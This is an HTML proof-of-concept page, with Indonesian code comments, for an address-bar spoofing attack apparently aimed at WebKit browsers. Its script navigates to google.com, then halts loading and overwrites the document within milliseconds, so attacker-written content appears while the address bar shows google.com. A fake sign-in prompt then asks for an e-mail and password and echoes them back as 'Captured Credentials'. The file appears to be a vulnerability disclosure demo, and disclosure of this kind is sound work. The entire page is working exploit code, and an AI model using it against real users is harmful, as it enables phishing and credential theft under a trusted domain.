<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Spoofing PoC</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      font-family: sans-serif;
      background-color: #f9f9f9;
    }
    .container {
      text-align: center;
      padding: 20px;
    }
    button {
      padding: 12px 24px;
      font-size: 18px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="container" id="main">
    <button onclick="executeSpoof()">Start Test</button>
  </div>

  <script>
    function executeSpoof() {
      // 1. Eksekusi navigasi ke target domain pada frame utama
      let win = window.open('https://www.google.com/about/', '_self');

      // 2. Tembakkan penulisan ulang dokumen sebelum context teardown selesai di WebKit
      setTimeout(() => {
        try {
          // Hentikan proses pemuatan halaman asli Google
          window.stop();

          // Timpa seluruh isi dokumen dengan konten buatan penyerang
          document.open();
          document.write(`
            <!DOCTYPE html>
            <html>
            <head><title>Spoofed Page</title></head>
            <body style="display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; font-family:sans-serif; background-color:#fff;">
              <div style="text-align:center; padding:20px;">
                <h1 style="color: red; font-size: 28px;">This is not Google.</h1>
                <p style="color: #333;">This custom HTML is rendered while the address bar displays google.com.</p>
              </div>
            </body>
            </html>
          `);
          document.close();

          // 3. Picu prompt opsional di atas halaman palsu tersebut
          setTimeout(() => {
            let user = prompt('Sign into your account in order to access www.google.com', 'E-mail / Password');
            if (user) {
              alert('Captured Credentials: ' + user);
            }
          }, 100);

        } catch (e) {
          console.warn("Cross-origin or frame access blocked:", e);
        }
      }, 0); // Jeda 0ms-20ms untuk mengeksploitasi pemicuan event loop WebKit
    }
  </script>

</body>
</html>
